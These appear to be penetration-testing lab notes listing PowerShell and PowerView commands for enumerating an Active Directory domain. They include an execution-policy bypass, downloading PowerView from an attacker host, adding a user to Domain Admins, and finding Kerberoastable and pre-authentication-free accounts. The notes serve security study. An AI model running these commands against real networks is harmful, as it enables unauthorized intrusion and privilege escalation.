```powershell
powershell -ep bypass
```

```powershell
net use z: \\192.168.100.200\exfil kali /user:kali
copy z:\PowerView.ps1 C:\ProgramData\
cd C:\ProgramData
Import-Module C:\ProgramData\PowerView.ps1
```
OR
```powershell
iwr -uri http://192.168.100.200/PowerView.ps1 -Outfile C:/ProgramData/PowerView.ps1
cd C:\ProgramData
Import-Module C:\ProgramData\PowerView.ps1
```

Domain Information (same as GetCurrentDomain)
```powershell
Get-NetDomain
```

All Users in domain
```powershell
Get-NetUser
```

Getting all users with password last changed and last logon time
```powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```

Enumerate groups and filter by common name
```powershell
Get-NetGroup | select cn
```

Enumerate a property from a specified object
```powershell
Get-NetGroup "Domain Admins" | select member
```

Enumerate Computer objects in domain
```powershell
Get-NetComputer
```

Enumerating computer objects by hostname, OS and OS version
```powershell
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

Scan domain to find local administrative privileges for current user
```powershell
Find-LocalAdminAccess
```

Check for logged on users
```powershell
Get-NetSession -ComputerName files04 -Verbose
```

View permissions on DefaultSecurity registry hive
```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

Enumerating Logged on users using PsLoggedon.exe (SysInternals suite)
```powershell
.\PsLoggedon.exe \\files04
```
>Might not work because it relies on Remote Registry service to be enabled

List Service Principal Name (SPN) accounts in domain
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

Can resolve SPNs that are hosting a web server via nslookup (eg. `HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80`)
```powershell
nslookup.exe web04.corp.com
```
> Will give you the IP address where it is being served on

Enumerate Access Control Entities
```powershell
Get-ObjectAcl -Identity admin
```

Convert SIDs into names
```powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```

Enumerating ACE of user/group and filtering by AD rights, displaying Security Identifier and Active Directory Rights
```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
Output can be translated by Convert-SidToName
```powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

Add user to domain group
```powershell
net group "Domain Admins" user /add /domain
```
> Can double check the result with Get-NetGroup

Find available shares in the domain
```powershell
Find-DomainShare
```

Display only shares available to current user in the domain
```powershell
Find-DomainShare -CheckShareAccess
```

Enumerate users that do not require Kerberos pre-authentication
```powershell
Get-DomainUser -PreauthNotRequired
```




